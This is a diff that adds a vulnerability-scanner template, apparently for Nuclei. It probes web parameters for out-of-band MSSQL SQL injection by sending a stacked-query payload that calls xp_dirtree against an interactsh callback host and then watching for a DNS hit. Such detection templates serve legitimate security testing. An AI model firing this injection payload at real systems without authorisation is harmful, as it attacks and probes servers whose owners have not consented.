@@ -1,0 +1,18 @@
+id: mssql-oob-xp-dirtree
+
+info:
+  name: MSSQL OOB SQLi via xp_dirtree
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,mssql,dns
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
